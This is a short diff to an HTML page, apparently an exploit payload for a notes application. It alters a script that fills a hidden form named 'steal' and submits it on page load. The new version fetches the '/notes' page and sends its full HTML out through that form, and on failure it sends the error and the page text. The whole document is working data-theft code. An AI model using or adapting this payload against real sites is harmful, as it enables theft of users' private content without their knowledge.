@@ -5,8 +5,16 @@
       <input type="hidden" name="note" id="note">
     </form>
     <script>
-      document.getElementById('note').value = document.body.innerText;
-      document.getElementById('steal').submit();
+      fetch('/notes')
+        .then(response => response.text())
+        .then(html => {
+          document.getElementById('note').value = html;
+          document.getElementById('steal').submit();
+        })
+        .catch(e => {
+          document.getElementById('note').value = 'ERROR: ' + e + '\n' + document.body.innerText;
+          document.getElementById('steal').submit();
+        });
     </script>
   </body>
 </html>
